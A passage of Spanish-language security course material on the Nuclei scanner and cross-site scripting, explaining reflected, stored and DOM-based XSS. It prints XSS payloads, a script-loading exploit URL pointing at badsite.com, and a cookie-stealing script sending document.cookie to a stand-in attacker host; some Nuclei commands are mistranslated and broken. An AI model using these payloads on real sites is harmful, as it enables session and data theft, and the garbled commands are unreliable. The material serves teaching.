> n√∫cleos -silent -t https: // ejemplo.com -t ~ /nuclei-templates/
> 
> 7. Especifica el n√∫mero de subprocesos simult√°neos para usar
> 
> n√∫cleos -c 10 -t https: // ejemplo.com -t ~ /nuclei-templates/
> 
> 8. Omitir plantillas que requieren
> 
> n√∫cleos de autenticaci√≥n - no -verify -t https: // ejemplo.com -t ~ /nuclei-templates/
> 
> 9. Personaliza el formato de salida del informe de
> 
> n√∫cleos nuclei -o output.txt -t https: // ejemplo. com -t ~ /nuclei-templates/
> 
> 10. Ignorar errores de certificado SSL
> 
> nuclei -insecure -t https: // ejemplo.com -t ~ /nuclei-templates/
> 
> 11. Especificar un encabezado HTTP personalizado para incluir en las solicitudes
> 
> nuclei -headers "Autorizaci√≥n: Bearer TOKEN" -t https: // ejemplo.com -t ~ /nuclei-templates/
> 
> 12. Especifique una cadena de agente de usuario personalizada para incluir en las solicitudes
> 
> nuclei -user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, como Gecko) Chrome/58.0.3029.110 Safari/537.3" -t https: // ejemplo.com -t ~ /nuclei-templates/
> 

<aside>
üëâ Estos comandos deber√≠an ayudarlo a comenzar a ejecutar Nuclei y personalizar sus pruebas de acuerdo con sus necesidades espec√≠ficas. Es importante tener en cuenta que Nuclei admite muchos m√°s comandos y opciones adem√°s de estos, as√≠ que aseg√∫rese de consultar la documentaci√≥n oficial para obtener m√°s informaci√≥n.
</aside>

### **Plantillas**

Para crear una plantilla para Nuclei, siga estos pasos:

1. Elija un objetivo para probar, como una aplicaci√≥n web o un servicio de red.
2. Identifique una vulnerabilidad o configuraci√≥n incorrecta que desee probar.
3. Utilice el lenguaje de plantilla de Nuclei para definir la prueba. El lenguaje de plantilla se basa en la sintaxis YAML y admite una amplia gama de funciones, como solicitudes HTTP, coincidencia de respuestas y variables. Consulte la documentaci√≥n de Nuclei para obtener m√°s informaci√≥n sobre el lenguaje de la plantilla y sus caracter√≠sticas.
4. Guarde la plantilla en un archivo con una extensi√≥n .yaml. Se recomienda guardar las plantillas en una carpeta dentro del directorio de plantillas de Nuclei para facilitar su administraci√≥n y organizaci√≥n.
5. Pruebe la plantilla ejecutando Nuclei con la bandera -t y especificando la ruta al archivo de plantilla. Por ejemplo:

> n√∫cleos -t https://example.com -t ~/nuclei-templates/my-template.yaml

Analice el resultado para determinar si la prueba fue exitosa y si se identific√≥ alguna vulnerabilidad o configuraci√≥n incorrecta. Realice cambios en la plantilla seg√∫n sea necesario y repita el proceso de prueba hasta lograr los resultados deseados.

- *Recuerde probar sus plantillas de manera cuidadosa y responsable, y siempre obtenga el permiso del objetivo antes de realizar cualquier pentest.*

### **Script de inyecci√≥n SQL de plantilla de n√∫cleos personalizados con explicaciones :**

> id: example-template¬†# A unique identifier for the template

> info:¬† # Information about the template

> name: Example Template

> author: Your Name

> severity: low

> requests:¬† # List of HTTP requests to send

> method: GET¬† # HTTP method (GET, POST, etc.)

> path: /¬† # Request path

> headers:¬† # Optional request headers

> User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)

> matchers:  # List of matchers to apply to the response

> type: word  # Matcher type (word, status, regex, etc.)

> words: "Example"¬† # Keyword to search for in the response

> attacks:  # Optional list of attack payloads to send

> - payload: "' OR true--"

### **Explicaci√≥n:**

- id: un identificador √∫nico para la plantilla que se puede utilizar para hacer referencia a ella en argumentos de l√≠nea de comandos y otras plantillas.
- info: metadatos sobre la plantilla, como el nombre, el autor y la gravedad de las vulnerabilidades o configuraciones incorrectas que prueba.
- requests: una lista de solicitudes HTTP para enviar al destino. Esta secci√≥n define el m√©todo HTTP, la ruta, los encabezados y otros atributos de las solicitudes. Las solicitudes se pueden personalizar a√∫n m√°s con variables, credenciales de autenticaci√≥n y otras caracter√≠sticas.
- matchers: Una lista de comparadores para aplicar a la respuesta de las solicitudes. Los comparadores definen c√≥mo buscar patrones o palabras clave espec√≠ficos en el cuerpo o los encabezados de la respuesta. Nuclei admite varios tipos de comparadores, como palabras, expresiones regulares, estados y binarios.
- attacks: una lista opcional de cargas √∫tiles de ataque para enviar las solicitudes. Estas cargas √∫tiles se pueden utilizar para probar vulnerabilidades como inyecci√≥n SQL, XSS e inyecci√≥n de comandos. Nuclei admite varios tipos de cargas √∫tiles, incluidas las basadas en archivos, las basadas en par√°metros y las basadas en JSON.

### **Conclusi√≥n**

Nuclei es una poderosa herramienta de c√≥digo abierto que automatiza el escaneo de vulnerabilidades de servicios de red y aplicaciones web. Su enfoque flexible y personalizable permite a los usuarios crear y utilizar plantillas para identificar vulnerabilidades y configuraciones err√≥neas. Al utilizar Nuclei con otras herramientas, los cazarrecompensas de errores pueden optimizar sus flujos de trabajo de prueba y mejorar la seguridad. El desarrollo de Nuclei y el apoyo de la comunidad lo convierten en una herramienta valiosa para las pruebas de seguridad.

# **XSS (secuencias de comandos entre sitios)**

Cross-site scripting (XSS) es un tipo de vulnerabilidad de seguridad que permite a un atacante inyectar c√≥digo malicioso en una p√°gina web vista por otros usuarios. El complemento no desinfecta y escapa a algunas de sus opciones emergentes, lo que podr√≠a permitir a los usuarios con un rol tan bajo como Colaborador realizar ataques de secuencias de comandos entre sitios almacenados, que podr√≠an usarse contra los administradores.

Las vulnerabilidades de "cross-site scripting" se producen cuando la falta de validaci√≥n de entradas permite a los usuarios inyectar c√≥digo de script en el sitio web de destino de forma que se ejecute en el navegador de otro usuario que est√© visitando el mismo sitio web. Esto eludir√≠a la pol√≠tica de mismo origen del navegador, ya que √©ste no tiene forma de distinguir el c√≥digo de script aut√©ntico del no aut√©ntico, aparte de su origen.

Seg√∫n el an√°lisis de Wordfence las vulnerabilidades de Cross Site Scripting son la vulnerabilidad m√°s com√∫n que se encuentra en los complementos de WordPress por un margen significativo.

![XSS1](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/xss1.png?raw=true)

Como puede ver en el gr√°fico anterior, si puede comprender completamente y eliminar solo las vulnerabilidades XSS en su c√≥digo PHP, escribir√° un 47% menos de vulnerabilidades. As√≠ que dediquemos un tiempo a analizar XSS, qu√© es, c√≥mo se explota y c√≥mo prevenir las vulnerabilidades de XSS.

Muchas aplicaciones web tienen vectores de entrada con los que los usuarios pueden interactuar. Cuando esas entradas se reflejan en el contenido de una p√°gina y no se desinfectan o filtran lo suficiente, los atacantes pueden intentar inyectar c√≥digo malicioso para alterar esa p√°gina. Los ataques m√°s comunes que aprovechan estas vulnerabilidades son XSS (Cross-Site Scripting) y ataques de desfiguraci√≥n. Si bien este tipo de desfiguraci√≥n solo altera la apariencia visual de un sitio web, un XSS puede permitir a los atacantes inyectar c√≥digo/scripts (JavaScript, por ejemplo) que ser√°n ejecutados por los navegadores de las v√≠ctimas, causando as√≠ muchos m√°s problemas a los usuarios.

La ejecuci√≥n de c√≥digo arbitrario en el navegador de una v√≠ctima puede permitir a un atacante realizar **el robo de cookies** (cuando las cookies no est√°n protegidas, los atacantes pueden robarlas y usarlas para autenticarse como v√≠ctimas sin tener que conocer su contrase√±a), **registro de teclas** (los atacantes pueden espiar el v√≠ctimas y recuperar sus pulsaciones de teclas) o **Phishing** (los atacantes pueden cambiar la apariencia y el comportamiento del sitio y enga√±ar a las v√≠ctimas para que env√≠en informaci√≥n confidencial a los servidores de los atacantes).

### ¬øPero, qu√© es una vulnerabilidad XSS?

Las vulnerabilidades XSS son incre√≠blemente f√°ciles de escribir. De hecho, si simplemente escribe PHP de una manera que parezca intuitiva, es casi seguro que escribir√° una vulnerabilidad XSS en su c√≥digo. Afortunadamente, las vulnerabilidades XSS tambi√©n son muy f√°ciles de reconocer.

| 1 | echo "The value you entered is: " . $_GET['val']; |
| --- | --- |
|  |  |

Esa es una vulnerabilidad XSS cl√°sica. Si incluye este c√≥digo en un complemento de WordPress, lo publica y su complemento se vuelve popular, no puede tener dudas de que un analista de seguridad en alg√∫n momento se comunicar√° con usted para informarle esta vulnerabilidad. Tendr√°s que arreglarlo y el analista lo har√° p√∫blico, dej√°ndote un poco avergonzado, pero con una aplicaci√≥n m√°s segura.

Entonces, ¬øpor qu√© se trata de una vulnerabilidad XSS? La forma en que funciona el c√≥digo anterior es que toma un valor de la URL y lo vuelve a escribir en el navegador, sin validar ni filtrar. Si su aplicaci√≥n est√° alojada en [https://example.com/test.php](https://example.com/test.php), un visitante del sitio podr√≠a visitar la siguiente URL:

> https://ejemplo.com/test.php?val=123

Luego ver√°n: "El valor que ingres√≥ es: 123" en su navegador. Probablemente la forma en que se dise√±√≥ la aplicaci√≥n para funcionar.

Si alguien visita la siguiente URL:

> https://example.com/test.php?val=<script>alert('Prueba que esto es un XSS');</script>

Ver√°n lo siguiente en el navegador: "El valor que ingres√≥ es:" y tambi√©n ver√°n un cuadro de alerta emergente que dice "Prueba que esto es un XSS".

### ¬øPor qu√© es peligrosa la salida sin filtrar?

Una demostraci√≥n que muestra un cuadro de alerta no parece una gran amenaza. Si no comprende completamente el impacto de una vulnerabilidad XSS y alguien le informa este problema con un cuadro de alerta() como demostraci√≥n de la vulnerabilidad, es posible que no se lo tome en serio. ¬øC√≥mo puede la prueba de que puede ejecutar JavaScript ser una prueba de un problema de seguridad grave?

Cuando un analista le env√≠a un cuadro de alerta () como prueba de una vulnerabilidad de seguridad, est√° demostrando que puede ejecutar c√≥digo JavaScript arbitrario en el navegador. Lo que realmente est√°n demostrando es que al enviar esa URL a otra persona, pueden lograr que esa otra persona ejecute javascript arbitrario en un navegador.

### **Una versi√≥n de un exploit podr√≠a verse as√≠:**

[https://example.com/test.php?val=<script](https://example.com/test.php?val=%3cscript) src=‚Äùhttp://badsite.com/badscript.js‚Äù></script>

El atacante enviar√° ese enlace a una v√≠ctima. Los pasos son los siguientes:

- La v√≠ctima hace clic en el enlace y visita el sitio. Supongamos que ya han iniciado sesi√≥n en el sitio web con acceso de nivel de administrador.
- El enlace y la vulnerabilidad XSS hacen que el script se cargue desde un sitio web externo a la p√°gina web de destino.
- El script tendr√° acceso completo al entorno DOM del navegador, incluida cualquier cookie HTTP que no est√© protegida por el indicador HttpOnly.
- El script realiza una acci√≥n maliciosa como usuario que ha iniciado sesi√≥n. Tambi√©n roba datos del sitio web al que puede acceder el usuario que ha iniciado sesi√≥n (por ejemplo, mensajes privados que el usuario ha recibido) y los env√≠a al atacante. Los datos se pueden enviar de varias maneras, pero una podr√≠a ser cargar una imagen como esta desde un sitio web externo: [http://badsite.com/badPretendImage.jpg?stolendata=secretDataValues](http://badsite.com/badPretendImage.jpg?stolendata=secretDataValues). badPretendImage.jpg es en realidad un script que muestra una imagen pero tambi√©n almacena los datos recibidos.

Ese es el mecanismo b√°sico de explotaci√≥n de una vulnerabilidad XSS: un atacante encuentra una manera de hacer que una v√≠ctima cargue su javascript utilizando una vulnerabilidad XSS en el sitio web. Lo usan para robar datos de los navegadores.

En el ejemplo anterior, hemos cargado un archivo javascript externo en la p√°gina. Las vulnerabilidades XSS var√≠an y, para una vulnerabilidad particular, puede que no sea factible incluir etiquetas <SCRIPT> que carguen un script externo completo. Si eso no funciona, lo que podr√≠a funcionar es agregar javascript directamente en el exploit que se ejecuta y realiza alguna acci√≥n maliciosa.

### ¬øQu√© es la bandera HttpOnly y por qu√© es importante?

Antes de la versi√≥n 6SP1 de Internet Explorer, las cookies eran accesibles tanto para los servidores web cuando un navegador realizaba una solicitud como para JavaScript. En otras palabras, un script que se ejecuta en el navegador de un sitio web en particular podr√≠a simplemente leer todas las cookies que el sitio web haya configurado.

Esto proporcion√≥ mucha flexibilidad a los desarrolladores, pero tambi√©n permiti√≥ que scripts maliciosos leyeran los valores de las cookies y los enviaran a cualquier lugar de Internet. Si un atacante pudiera explotar una vulnerabilidad XSS, lo primero que har√≠a ser√≠a robar todas las cookies que pudiera leer. Esto les permitir√≠a obtener acceso instant√°neo a nivel administrativo a sitios web si la v√≠ctima hubiera iniciado sesi√≥n en el sitio web de destino como administrador.

En 2002, Microsoft lanz√≥ una funci√≥n con Internet Explorer Service Pack 1 que proporcionaba un indicador especial opcional que pod√≠a configurarse cuando se configuraba una cookie. El indicador se llama HttpOnly y especifica que cualquier cookie que incluya el indicador HttpOnly no debe ser legible por javascript y solo debe enviarse al servidor web que configur√≥ la cookie a trav√©s de HTTP. De ah√≠ el nombre 'HttpOnly'. Otros proveedores de navegadores adoptaron r√°pidamente la funci√≥n porque los beneficios de seguridad eran claros. Esta bandera proporcion√≥ una forma s√≥lida de proteger las cookies confidenciales de ataques XSS. Hoy en d√≠a, todos los principales proveedores de navegadores admiten la bandera HttpOnly.

WordPress tambi√©n utiliza el indicador HttpOnly para proteger las cookies, lo que evita que un atacante que aproveche una vulnerabilidad XSS robe cookies confidenciales.

Consejo: Cambiar la contrase√±a de un usuario de WordPress invalida sus cookies inmediatamente. Esto se puede utilizar para cerrar la sesi√≥n de un usuario en caso de sospecha de infracci√≥n.

### **Consecuencias**

Esto puede permitir al atacante robar informaci√≥n confidencial, como credenciales de inicio de sesi√≥n o datos personales, o realizar acciones en nombre de la v√≠ctima, como realizar transacciones no autorizadas o publicar spam.

El XSS almacenado, en particular, ocurre cuando el c√≥digo malicioso se almacena permanentemente en el sitio web, lo que le permite afectar a cualquier usuario que visite la p√°gina afectada. Las consecuencias pueden incluir p√©rdidas financieras, filtraciones de datos o da√±os a la reputaci√≥n del sitio web.

Las principales consecuencias de XSS son:

- **Robo de informaci√≥n:** Un atacante puede robar informaci√≥n confidencial del usuario, como credenciales de inicio de sesi√≥n, informaci√≥n bancaria o datos personales.
- **Ataques de phishing**: Se puede utilizar XSS para enga√±ar a los usuarios para que proporcionen informaci√≥n personal o confidencial, como contrase√±as o n√∫meros de tarjetas de cr√©dito.
- **Manipulaci√≥n del contenido:** Tambi√©n puede ser utilizado para manipular el contenido de un sitio web, por ejemplo, para mostrar mensajes falsos, redireccionar a los usuarios a sitios maliciosos o incluso para cambiar la apariencia del sitio web.
- **Robo de sesiones:** Es posible inyectar c√≥digo malicioso que intercepte la sesi√≥n de un usuario, lo que le permite realizar acciones en nombre del usuario.
- **Difusi√≥n de malware:** Tambi√©n un atacante puede utilizar XSS para inyectar c√≥digo malicioso que descarga y ejecuta malware en el equipo del usuario sin su conocimiento o consentimiento.
- El impacto exacto depende en gran medida de la aplicaci√≥n.
- XSS es generalmente una amenaza para las aplicaciones web que tienen usuarios autenticados o que son sensibles a la seguridad.
- El c√≥digo malicioso puede ser capaz de manipular el contenido del sitio, cambiando su apariencia y/o funci√≥n para otro usuario.
- Esto incluye modificar el comportamiento de la aplicaci√≥n web (como redirigir formularios, etc.).
- El c√≥digo tambi√©n puede ser capaz de realizar acciones dentro de la aplicaci√≥n sin conocimiento del usuario.
- El c√≥digo script tambi√©n puede obtener y retransmitir los valores de las cookies si no han sido configuradas como HttpOnly.

### Hay 3 tipos principales de XSS

- **Almacenado** : la entrada del usuario se almacena en el sitio web. Suele ocurrir en perfiles de usuario, foros, chats, etc., donde el contenido del usuario se almacena de forma permanente (o temporal). Los atacantes pueden inyectar cargas √∫tiles maliciosas y todos los usuarios que naveguen por la p√°gina infectada se ver√°n afectados. Esta es una de las formas m√°s peligrosas de XSS porque la explotaci√≥n no requiere phishing y puede afectar a muchos usuarios. Los XSS en p√°ginas en las que solo el usuario del atacante tiene derecho a navegar (por ejemplo, la p√°gina de configuraci√≥n del usuario) se denominan self-XSS y se considera que tienen un impacto cercano a 0, ya que te√≥ricamente no puede afectar a otros usuarios.
- **Reflejado** : la entrada del usuario se refleja pero no se almacena. Suele ocurrir en formularios de b√∫squeda, p√°ginas de inicio de sesi√≥n y p√°ginas que reflejan contenido para una sola respuesta. Cuando la entrada vulnerable reflejada est√° en el URI ( [http://www.target.com/search.php?keyword=INJECTION](http://www.target.com/search.php?keyword=INJECTION)), los atacantes pueden crear un URI malicioso y enviarlo a las v√≠ctimas con la esperanza de que lo exploren. Esta forma de XSS generalmente requiere phishing y los atacantes pueden limitar la longitud de la carga maliciosa.
- **Basado en DOM** : mientras que los ataques XSS almacenados y reflejados explotan vulnerabilidades en el c√≥digo del lado del servidor, un XSS basado en DOM explota las del lado del cliente (por ejemplo, JavaScript utilizado para ayudar a representar din√°micamente una p√°gina). Los XSS basados ‚Äã‚Äãen DOM generalmente afectan las entradas del usuario que se reflejan temporalmente, al igual que los ataques XSS reflejados.

## Pr√°ctica:

Los evaluadores deben identificar los vectores de entrada (partes de la aplicaci√≥n que aceptan contenido de los usuarios) que se almacenan o reflejan.

- Par√°metros de URI para XSS reflejado y basado en DOM
- Otras entradas de usuarios en foros, chats, comentarios, publicaciones y otro contenido almacenado para XSS almacenado
- Encabezados HTTP como cookies (e incluso agentes de usuario en algunos casos)

Una de las cargas √∫tiles m√°s famosas es <script>alert('XSS');</script>abrir una ventana emergente que hace eco de "XSS". Sin embargo, explotar XSS es como jugar al "gato y al rat√≥n". Las entradas se pueden filtrar y los filtros se pueden omitir. A continuaci√≥n se muestran algunos ejemplos b√°sicos de cargas √∫tiles XSS.

> <script>alert('XSS');</script>
> 
> 
> <IMG SRC=JaVaScRiPt:alert('XSS')>
> 
> <IMG onmouseover="alert('XSS')">
> 
> <<SCRIPT>alert("XSS");//<</SCRIPT>

> El siguiente [sitio web](https://transformations.jobertabma.nl/) ( [proyecto GitHub](https://github.com/jobertabma/transformations) ) puede ayudar a identificar las transformaciones aplicadas a las entradas de los usuarios. Esto puede ayudar a eludir filtros y transformaciones para aprovechar los ataques XSS.

> La siguiente carga √∫til se utiliza para probar inyecciones de SQL , XSS (Cross-Site Scripting) y SSTI (Inyecci√≥n de plantilla del lado del servidor) .
> 
> '"<svg/onload=prompt(5);>{{7*7}}


Herramientas como [XSStrike](https://github.com/s0md3v/XSStrike) (Python) y [XSSer](https://github.com/epsylon/xsser) (Python) tambi√©n pueden ayudar a encontrar y explotar vectores de entrada vulnerables XSS al fusionarlos con cargas √∫tiles √∫nicas y luego buscar patrones √∫nicos en las respuestas.

‚ÄãEl atacante no apunta directamente a su v√≠ctima. En cambio, explota una vulnerabilidad en un sitio web que visita la v√≠ctima, para que el sitio web le entregue el JavaScript malicioso. Para el navegador de la v√≠ctima, el JavaScript malicioso parece ser una parte leg√≠tima del sitio web y, por lo tanto, el sitio web ha actuado como c√≥mplice involuntario del atacante.

# **C√≥mo se inyecta el JavaScript malicioso**

La √∫nica forma que tiene el atacante de ejecutar su JavaScript malicioso en el navegador de la v√≠ctima es inyectarlo en una de las p√°ginas que la v√≠ctima descarga del sitio web. Esto puede suceder si el sitio web incluye directamente la entrada del usuario en sus p√°ginas, porque el atacante puede insertar una cadena que el navegador de la v√≠ctima tratar√° como c√≥digo.

En el siguiente ejemplo, se utiliza un script simple del lado del servidor para mostrar el √∫ltimo comentario en un sitio web:

> print "<html>"
> 
> 
> print "Latest comment:"
> 
> print database.latestComment
> 
> print "</html>"

El script supone que un comentario consta √∫nicamente de texto. Sin embargo, dado que la entrada del usuario se incluye directamente, un atacante podr√≠a enviar este comentario: " <script>...</script>". Cualquier usuario que visite la p√°gina recibir√° ahora la siguiente respuesta:

> <html>
> 
> 
> Latest comment:
> 
> **<script>...</script>**
> 
> </html>
> 

Cuando el navegador del usuario carga la p√°gina, ejecutar√° cualquier c√≥digo JavaScript contenido dentro de las <script>etiquetas. El atacante ahora ha tenido √©xito con su ataque.

## **¬øQu√© es JavaScript malicioso?**

Al principio, la capacidad de ejecutar JavaScript en el navegador de la v√≠ctima puede no parecer particularmente maliciosa. Despu√©s de todo, JavaScript se ejecuta en un entorno muy restringido que tiene un acceso extremadamente limitado a los archivos y al sistema operativo del usuario. De hecho, podr√≠a abrir la consola JavaScript de su navegador ahora mismo y ejecutar cualquier JavaScript que desee, y ser√≠a muy poco probable que cause alg√∫n da√±o a su computadora.

Sin embargo, la posibilidad de que JavaScript sea malicioso se vuelve m√°s clara cuando se consideran los siguientes hechos:

- JavaScript tiene acceso a parte de la informaci√≥n confidencial del usuario, como las cookies.
- JavaScript puede enviar solicitudes HTTP con contenido arbitrario a destinos arbitrarios mediante el uso XMLHttpRequestde otros mecanismos.
- JavaScript puede realizar modificaciones arbitrarias al HTML de la p√°gina actual utilizando m√©todos de manipulaci√≥n DOM.

Estos hechos combinados pueden provocar fallos de seguridad muy graves, como explicaremos a continuaci√≥n.

### **Las consecuencias del JavaScript malicioso**

Entre muchas otras cosas, la capacidad de ejecutar JavaScript arbitrario en el navegador de otro usuario permite a un atacante realizar los siguientes tipos de ataques:

### **Robo de cookies**

El atacante puede acceder a las cookies de la v√≠ctima asociadas con el sitio web mediante document.cookie, enviarlas a su propio servidor y utilizarlas para extraer informaci√≥n confidencial como ID de sesi√≥n.

### **Registro de teclas**

El atacante puede registrar un detector de eventos de teclado addEventListenery luego enviar todas las pulsaciones de teclas del usuario a su propio servidor, registrando potencialmente informaci√≥n confidencial como contrase√±as y n√∫meros de tarjetas de cr√©dito.

### **Suplantaci√≥n de identidad**

El atacante puede insertar un formulario de inicio de sesi√≥n falso en la p√°gina mediante manipulaci√≥n DOM, configurar el actionatributo del formulario para que apunte a su propio servidor y luego enga√±ar al usuario para que env√≠e informaci√≥n confidencial.

<aside>
üëâ Aunque estos ataques difieren significativamente, todos tienen una similitud crucial: debido a que el atacante ha inyectado c√≥digo en una p√°gina proporcionada por el sitio web, el JavaScript malicioso se ejecuta en el contexto de ese sitio web. Esto significa que se trata como cualquier otro script de ese sitio web: tiene acceso a los datos de la v√≠ctima para ese sitio web (como las cookies) y el nombre de host que se muestra en la barra de URL ser√° el del sitio web. Para todos los efectos, el script se considera una parte leg√≠tima del sitio web, lo que le permite hacer cualquier cosa que el sitio web real pueda hacer.
</aside>

**Este hecho pone de relieve una cuesti√≥n clave:**

*Si un atacante puede utilizar su sitio web para ejecutar JavaScript arbitrario en el navegador de otro usuario, la seguridad de su sitio web y de sus usuarios se ha visto comprometida.* Para enfatizar este punto, algunos ejemplos de este tutorial omitir√°n los detalles de un script malicioso al mostrar solo <script>...</script>. Esto indica que la mera presencia de un script inyectado por el atacante es el problema, independientemente del c√≥digo espec√≠fico que realmente ejecute el script.

# **Actores en un ataque XSS**

Antes de describir en detalle c√≥mo funciona un ataque XSS, debemos definir los actores involucrados en un ataque XSS. En general nvolucra a tres actores: **el sitio web** , **la v√≠ctima** y **el atacante** .

- **El sitio web** ofrece p√°ginas HTML a los usuarios que las solicitan. En nuestros ejemplos, est√° ubicado en [http://website/](http://website/).
- **La base de datos del sitio web** es una base de datos que almacena algunas de las entradas del usuario incluidas en las p√°ginas del sitio web.
- **La v√≠ctima** es un usuario normal del sitio web que solicita p√°ginas del mismo a trav√©s de su navegador.
- **El atacante** es un usuario malintencionado del sitio web que pretende lanzar un ataque contra la v√≠ctima explotando una vulnerabilidad XSS en el sitio web.
- **El servidor del atacante** es un servidor web controlado por el atacante con el √∫nico prop√≥sito de robar informaci√≥n confidencial de la v√≠ctima. En nuestros ejemplos, est√° ubicado en [http://attacker/](http://attacker/).

**Un ejemplo de escenario de ataque**

En este ejemplo, asumiremos que el objetivo final del atacante es robar las cookies de la v√≠ctima explotando una vulnerabilidad XSS en el sitio web. Esto se puede hacer haciendo que el navegador de la v√≠ctima analice el siguiente c√≥digo HTML:

> <script>
> 
> 
> window.location='http://attacker/?cookie='+document.cookie
> 
> </script>

Este script navega por el navegador del usuario a una URL diferente, lo que activa una solicitud HTTP al servidor del atacante. La URL incluye las cookies de la v√≠ctima como par√°metro de consulta, que el atacante puede extraer de la solicitud cuando llega a su servidor. Una vez que el atacante ha adquirido las cookies, puede utilizarlas para hacerse pasar por la v√≠ctima y lanzar m√°s ataques.

De ahora en adelante, el c√≥digo HTML anterior se denominar√° **cadena maliciosa** o **script malicioso.** Es importante tener en cuenta que la cadena en s√≠ s√≥lo es maliciosa si finalmente se analiza como HTML en el navegador de la v√≠ctima, lo que s√≥lo puede ocurrir como resultado de una vulnerabilidad XSS en el sitio web.

## **C√≥mo funciona el ataque**

El siguiente diagrama ilustra c√≥mo un atacante puede realizar este ataque de ejemplo:

![XSS2](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/xss2.png?raw=true)

1. El atacante utiliza uno de los formularios del sitio web para insertar una cadena maliciosa en la base de datos del sitio web.
2. La v√≠ctima solicita una p√°gina del sitio web.
3. El sitio web incluye la cadena maliciosa de la base de datos en la respuesta y la env√≠a a la v√≠ctima.
4. El navegador de la v√≠ctima ejecuta el script malicioso dentro de la respuesta y env√≠a las cookies de la v√≠ctima al servidor del atacante.

## **Tipos de XSS**

Si bien el objetivo de un ataque XSS es siempre ejecutar JavaScript malicioso en el navegador de la v√≠ctima, existen pocas formas fundamentalmente diferentes de lograr ese objetivo. Los ataques XSS suelen dividirse en tres tipos:

- **XSS persistente** , donde la cadena maliciosa se origina en la base de datos del sitio web.
- **XSS reflejado** , donde la cadena maliciosa se origina a partir de la solicitud de la v√≠ctima.
- **XSS basado en DOM** , donde la vulnerabilidad est√° en el c√≥digo del lado del cliente en lugar del c√≥digo del lado del servidor.

<aside>
üí° El ejemplo anterior ilustr√≥ un ataque XSS persistente. Ahora describiremos los otros dos tipos de ataques XSS: XSS reflejado y XSS basado en DOM.
</aside>

### **XSS reflejado**

En un ataque XSS reflejado, la cadena maliciosa es parte de la solicitud de la v√≠ctima al sitio web. Luego, el sitio web incluye esta cadena maliciosa en la respuesta enviada al usuario. El siguiente diagrama ilustra este escenario:

![XSS3](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/xss3.png?raw=true)

1. El atacante crea una URL que contiene una cadena maliciosa y se la env√≠a a la v√≠ctima.
2. El atacante enga√±a a la v√≠ctima para que solicite la URL del sitio web.
3. El sitio web incluye la cadena maliciosa de la URL en la respuesta.
4. El navegador de la v√≠ctima ejecuta el script malicioso dentro de la respuesta y env√≠a las cookies de la v√≠ctima al servidor del atacante.

**¬øC√≥mo puede tener √©xito el XSS reflejado?**

Al principio, el XSS reflejado puede parecer inofensivo porque requiere que la propia v√≠ctima env√≠e una solicitud que contenga una cadena maliciosa. Dado que nadie se atacar√≠a voluntariamente, no parece haber forma de realizar el ataque.

Resulta que hay al menos dos formas comunes de hacer que una v√≠ctima lance un ataque XSS reflejado contra s√≠ misma:

- Si el usuario se dirige a un individuo espec√≠fico, el atacante puede enviar la URL maliciosa a la v√≠ctima (mediante correo electr√≥nico o mensajer√≠a instant√°nea, por ejemplo) y enga√±arla para que la visite.
- Si el usuario se dirige a un grupo grande de personas, el atacante puede publicar un enlace a la URL maliciosa (en su propio sitio web o en una red social, por ejemplo) y esperar a que los visitantes hagan clic en √©l.

Estos dos m√©todos son similares y ambos pueden tener m√°s √©xito con el uso de un servicio de acortamiento de URL, que enmascara la cadena maliciosa de los usuarios que de otro modo podr√≠an identificarla.

Lo que hemos discutido anteriormente es una vulnerabilidad XSS reflejada. Un ataque XSS reflejado suele ser un enlace que contiene c√≥digo malicioso. Cuando alguien hace clic en ese enlace, se le dirige a un sitio web vulnerable y ese c√≥digo malicioso se "refleja" en su navegador para realizar alguna acci√≥n maliciosa.

Los ataques XSS reflejados son mucho menos peligrosos que las vulnerabilidades XSS almacenadas (ver m√°s abajo) por varias razones:

Los ataques XSS reflejados dependen de que la v√≠ctima realice alg√∫n tipo de acci√≥n mediante la cual visita el sitio web de destino y hace que genere contenido que realiza una acci√≥n maliciosa en su navegador. Esto hace que los ataques XSS reflejados sean muy dif√≠ciles o, a veces, imposibles de automatizar. Cada v√≠ctima debe ser atacada individualmente con un correo electr√≥nico o alg√∫n otro contenido que contenga un enlace malicioso en el que deben hacer clic para ser el objetivo del ataque.

### **XSS basado en DOM**

XSS basado en DOM es una variante de XSS tanto persistente como reflejado. En un ataque XSS basado en DOM, el navegador de la v√≠ctima no analiza la cadena maliciosa hasta que se ejecuta el JavaScript leg√≠timo del sitio web. El siguiente diagrama ilustra este escenario para un ataque XSS reflejado:

![XSS4](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/xss4.png?raw=true)

1. El atacante crea una URL que contiene una cadena maliciosa y se la env√≠a a la v√≠ctima.
2. El atacante enga√±a a la v√≠ctima para que solicite la URL del sitio web.
3. El sitio web recibe la solicitud, pero no incluye la cadena maliciosa en la respuesta.
4. El navegador de la v√≠ctima ejecuta el script leg√≠timo dentro de la respuesta, lo que provoca que el script malicioso se inserte en la p√°gina.
5. El navegador de la v√≠ctima ejecuta el script malicioso insertado en la p√°gina y env√≠a las cookies de la v√≠ctima al servidor del atacante.

**¬øQu√© hace que XSS basado en DOM sea diferente?**

En los ejemplos anteriores de ataques XSS persistentes y reflejados, el servidor inserta el script malicioso en la p√°gina, que luego se env√≠a como respuesta a la v√≠ctima. Cuando el navegador de la v√≠ctima recibe la respuesta, asume que el script malicioso es parte del contenido leg√≠timo de la p√°gina y lo ejecuta autom√°ticamente durante la carga de la p√°gina como con cualquier otro script.

Sin embargo, en el ejemplo de un ataque XSS basado en DOM, no se inserta ning√∫n script malicioso como parte de la p√°gina; el √∫nico script que se ejecuta autom√°ticamente durante la carga de la p√°gina es una parte leg√≠tima de la p√°gina. El problema es que este script leg√≠timo utiliza directamente la entrada del usuario para agregar HTML a la p√°gina. Debido a que la cadena maliciosa se inserta en la p√°gina usando innerHTML, se analiza como HTML, lo que provoca que se ejecute el script malicioso.

**La diferencia es sutil pero importante:**

- En XSS tradicional, el JavaScript malicioso se ejecuta cuando se carga la p√°gina, como parte del HTML enviado por el servidor.
- En XSS basado en DOM, el JavaScript malicioso se ejecuta en alg√∫n momento despu√©s de que la p√°gina se haya cargado, como resultado de que el JavaScript leg√≠timo de la p√°gina trata la entrada del usuario de forma insegura.

**Por qu√© es importante el XSS basado en DOM**

